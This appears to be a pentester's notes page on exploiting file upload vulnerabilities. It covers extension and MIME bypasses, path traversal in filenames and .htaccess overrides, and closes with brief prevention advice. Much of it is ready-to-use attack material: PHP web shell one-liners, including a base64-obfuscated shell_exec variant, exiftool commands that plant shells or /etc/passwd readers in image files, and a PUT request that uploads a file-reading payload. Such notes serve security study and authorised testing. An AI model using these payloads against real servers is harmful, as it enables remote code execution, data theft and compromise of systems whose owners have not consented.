# File Upload

{% embed url="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Images/file-upload-mindmap.png" %}

There are different categories:

* We can upload files executed by the web application. Apart from PHP, we can also leverage this kind of vulnerability in other frameworks or server-side scripting languages.
* When we <mark style="color:blue;">chain</mark> file upload with another vulnerability, such as Directory Traversal. For example, if the web application is vulnerable to Directory Traversal, we can use a relative path in the file upload request and try to overwrite files like **authorized\_keys**. Furthermore, we can also combine file upload mechanisms with XXE or XSS attacks. For example, when we are allowed to upload an avatar to a profile with an _SVG_ file type, we may embed an XXE attack to display file contents or even execute code.
* <mark style="color:blue;">User interaction</mark>. For example, when we discover an upload form for job applications, we can try to upload a CV in **.docx** format with malicious _macros_.
* We may encounter scenarios where we find an unrestricted file upload mechanism, but cannot exploit it. One example for this is _Google Drive_. In situations such as this,we need to leverage another vulnerability such as Directory Traversal to abuse the file upload mechanism.
* When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.
* Depending on the web application and its usage, we can make educated guesses to locate upload mechanisms. If the web application is a Content Management System (CMS), we can often upload an avatar for our profile or create blog posts and web pages with attached files. If our target is a company website, we can often find upload mechanisms in career sections or company-specific use cases. For example, if the target website belongs to a lawyer’s office, there may be an upload mechanism for case files. Sometimes the file upload mechanisms are not obvious to users, so we should never skip the enumeration phase when working with a web application.
* **Change file extension to .phps .php7 .pHP**
* **Upload the shell as .txt or .jpg and then rename it to its real extension**
* When uploading a file, try **../../../../file.txt (and variations like ..%2ffile.php)** to search for Directory Traversal on the filename parameter. If the application accepts it, try to overwrite files such as /root/authorized\_keys or other files, upload files to other locations and so on.

{% hint style="danger" %}
Use Burp Proxy for testing as well, do not trust blindy on Repeater
{% endhint %}

File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size.

## What is the impact of file upload vulnerabilities?

* If we can upload file extension like .jsp and that language is interpreted by the webserver, it could mean RCE.
* Improper filename -> overwrite critical files.
* Path Traversal -> upload files to unanticipated locations.
* File size -> DoS

## How do file upload vulnerabilities arise?

* Blacklist instead of whitelist
* Check properties that can be easily manipulated with Burp
* Discrepancies -> robust validation measures may be applied inconsistently across the network

## How do web servers handle requests for static files?

• If this file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in an HTTP response.

• If the file type is executable (PHP), **and** the server is configured to execute files of this type, it will assign variables based on the headers and parameters in the HTTP request before running the script.

• If the file type is executable, but the server **is not** configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to leak source code and other sensitive information. You can see an example of this in our information disclosure learning materials.

{% hint style="info" %}
The `Content-Type` response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping.
{% endhint %}

<pre class="language-sh" data-overflow="wrap" data-full-width="true"><code class="lang-sh">https://book.hacktricks.xyz/pentesting-web/file-upload
https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/
https://www.prplbx.com/resources/blog/exploiting-file-upload-vulnerabilities/
https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf
https://github.com/almandin/fuxploider
<strong>
</strong><strong># Exploiting unrestricted file uploads to deploy a web shell
</strong>Upload PHP webshell for example and access it

# Flawed file type validation
POST request usually w/ content type application/x-www-form-url-encoded
For sending large amounts of binary data -> content type multipart/form-data is preferred.
# Do not trust Content-Type = MIME type since Content-Type can be manipulated on Burp
Example: upload PHP file -> change Content-Type: application/x-php to Content-Type: image/jpeg

# Preventing file execution in user-accessible directories
Stops file execution on some folders but, what if we upload the file on a unexpected folder?
# Web servers often use the filename field in multipart/form-data requests to determine
# the name and location where the file should be saved. 
Example: modify filename="webshell.php" to "%2E%2E%2Fwebshell%2Ephp" (uploads one dir up)

# Insufficient blacklisting of dangerous file types
.php5, .shtml instead of .php


# Overriding the server configuration
------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename=".htaccess" &#x3C;!-- Specify the name of config file -->
Content-Type: text/plain

AddType application/x-httpd-php .abc

------abcdefghijk
# .htaccess works as directory-specific file. We could overwrite it to allow execution of other filetypes
# directory-specific configuration on IIS servers using a web.config file.
&#x3C;staticContent>
    &#x3C;mimeMap fileExtension=".json" mimeType="application/json" />
    &#x3C;/staticContent>
EXAMPLE: upload .htaccess setting .abc files as PHP executables and then upload our malicious .abc file


# Obfuscating file extensions
exploit.pHp # case insensitive
exploit.php.jpg # multiple extensions
exploit.php. # add trailing characters
exploit%2Ephp # URL encoding (or double URL encoding) for . / \
exploit.asp;.jpg exploit.asp%00.jpg # Add semicolons or URL-encoded null byte characters before the file extension
# Multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization.
xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII
exploit.p.phphp # in case dangerous extension is removed, it still leaves behind a valid extension

# Flawed validation of the file's contents
FF D8 FF # JPEG Magic Bytes
# Polyglot Files
https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack-on-exiftool/#polyglot-attack
convert -size 32x32 xc:white test.jpg
exiftool -Comment='&#x3C;?php echo system($_GET["cmd"]); ?>' test.jpg -o polyglot.php
exiftool -Comment="&#x3C;?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" test.jpg -o polyglot.php

# Race Conditions
Good -> upload file first to a sandboxed folder, process it and if safe, move it to real folder w/ random filename
Implementing your own processing of file uploads independently of any framework is dangerous.
Some webs upload file to the main filesystem then remove if unsafe -> those ms are enough for execution
Very subtle vuln, difficult to detect on blackbox pentest unless you leak or have source code available.
# Race conditions in URL-based file uploads
PHP uniqid() can potentially be brute-forced.
Upload a large file. If processes by chunks, maybe malicious file at the start followed by large padding bytes.

# WITHOUT REMOTE CODE EXECUTION
# Uploading malicious client-side scripts
you may still be able to upload scripts for client-side attacks
Example: HTML files or SVG images with &#x3C;script> tags to create stored XSS payloads
If uploaded file appears on a page visited by other users, their browser will execute the script when it tries to render the page.
NOTE: due to SOP restrictions, attack only works if uploaded file is served from same origin to which you upload it
# Exploiting vulnerabilities in the parsing of uploaded files
Example: if server parses XML-based files, such as .doc,.xls, it is a potencial vector for XXE injection attacks. 


# Uploading files using PUT
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

&#x3C;?php echo file_get_contents('/path/to/file'); ?>
# NOTE: send OPTIONS requests to different endpoints to test for any that advertise support for the PUT method. 
</code></pre>

## General Methodology

{% tabs %}
{% tab title="Tips" %}
{% code overflow="wrap" %}
```bash
# Gobuster: VERY IMPORTANT TO USE -f to append / to each request
gobuster dir -f -t 100 -u $URL -w $DICT -x php,txt,html
#-------------------------
# Magic numbers
#-------------------------
# Use the Wikipedia list and VERY IMPORTANT check the filetype with file after it, if it does not work then try other magic numbers.
# EXAMPLE FOR PNG:
echo -e '\x89\x50\x4e\x47\x0d\x0a\x1a\n<?php echo shell_exec($_REQUEST["cmd"]); ?>' > shell.php.png 
```
{% endcode %}
{% endtab %}

{% tab title="Injecting PHP into images" %}
{% code overflow="wrap" %}
```bash
# USING EXIFTOOL TO INSERT IT ON THE COMMENT SECTION (test before, then AV evasion)
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test.jpeg.php

# ALTERNATIVE
echo "PHP CODE" | cat - image.jpg > test.jpg

exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpegexiftool -comment<=back.php hack.png
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Overwriting Existing Files

Web pages, for example, should not be writeable to the web user, thus preventing them from being overwritten with a malicious version uploaded by an attacker.\
If we can upload files and reviewing the source code or by other means we find a existent file with its URI, try to overwrite it by uploading another one with the same filename.&#x20;

## RCE

Upload a program written in the same language as the back-end of the website (or another language which the server understands and will execute).

Two main options: webshells and reverse shells.

## Client-side (sb open our files)

If upload form present and it seems somebody could be opening our files, try **.html file with a resource** as its content such as:

```
<img src="http://$IP/cat.png"/>
```

## Filtering

{% code overflow="wrap" fullWidth="true" %}
```bash
Client-side are filters run in our web browser before the file is uploaded.
Server-side filters are run on the server (PHP, C#, Node.js, Python, Ruby on Rails...).

# EXTENSION VALIDATION
curl -s -X GET "http://box.com/" | htmlq -p #then check different .js files and more, pipe jq  | jq for JSON 
The approach might be whitelist/blacklist extensions

# FILE TYPE FILTERING
MIME validation (image/jpeg, x-php/application)

# MAGIC NUMBER
For example, a PNG file would have these bytes at the very top of the file: 89 50 4E 47 0D 0A 1A 0A

# FILE LENGTH
To not starve the server of resources, take it in mind to make shells smaller if needed

# FILE NAME
Best options are randomize the filenames and sanitise them in case they contain "bad characters"
More complicated filtering systems may scan the full contents of an uploaded file to ensure that it's not spoofing its extension, MIME type and Magic Number. 
Web frameworks also have their defences in place.
```
{% endcode %}

## Bypassing Client-Side Filtering

{% code overflow="wrap" fullWidth="true" %}
```bash
VERY IMPORTANT: ANOTHER WAY TO BYPASS IS JUST DELETING ALL THE .js FILTER OR JUST DROPPING THE REQUEST ON BURP SUITE (USE DROP BUTTON).

- Turn off Javascript
- Intercept the request and modify/delete the Javascript (.js) filter with Burpsuite (Intercept the response to the request as well)
- Intercept and modify the upload (for example, change MIME type to text/x-php and/or file extension)
- Send the file directly to the upload point
curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
```
{% endcode %}

## Bypassing Server-Side Filtering

```bash
# FILE EXTENSIONS
- Upload other PHP extensions .php5 .php7 .phar .phtml .pgif ...
- Double extensions .php.jpg or .jpg.php

# MAGIC NUMBERS
https://en.wikipedia.org/wiki/List_of_file_signatures
- Try GIF8; or GIF89a; before <?php code in case the server only accepts images
- Type AAAA before <?php and then with hexeditor modify those bytes for a valid value
```

## Overwrite Server Configuration (.htaccess, .htpasswd...)

[https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#overwrite-server-configuration](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#overwrite-server-configuration)

#### [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)

## exiftool

{% code overflow="wrap" %}
```bash
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-USERNAME.jpeg.php
# With PHP Obfuscation
exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-USERNAME.jpeg.php
```
{% endcode %}

## Example Methodology

<pre data-overflow="wrap" data-full-width="true"><code>1 - Take a look at the website as a whole. Use Wappalyzer to look for languages and frameworks the web application might have been built with (manually, making a request to the website and intercepting the response with Burpsuite). Headers such as server or x-powered-by can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page.
2 - If upload page found, look at source code in case there client-side scripts.
3 - Upload an innocent file to see the server's behaviour (if we can access the upload folder, what is the naming scheme...). Use Gobuster with -x (extension option) to find that file/path if not obvious.

4 - Upload a malicious file bypassing existent client-side filters. If it is stopped by the webserver, find why:
- If uploading testing.invalidextension works, chances are that the server is using an extension blacklist to filter out executable files. If this upload fails then any extension filter will be operating on a whitelist.
- Reupload innocent file but changing magic number to be sth that you would expect to be filtered. If the upload fails then you know that the server is using a magic number based filter.
<strong>- Reupload the innocent file again but in this case change MIME type to sth that you would expect to be filtered. If the upload fails then you know that the server is filtering based on MIME types.
</strong><strong>- Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter.
</strong></code></pre>

## How to prevent file upload vulnerabilities

* Whitelist of permitted extensions.
* Make sure no substring such as ../ that could be interpreted as path traversal.
* Rename uploaded files to avoid collisions / overwritten files.
* Do not upload files to the server's permanent filesystem until they have been validated
* Use established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms.
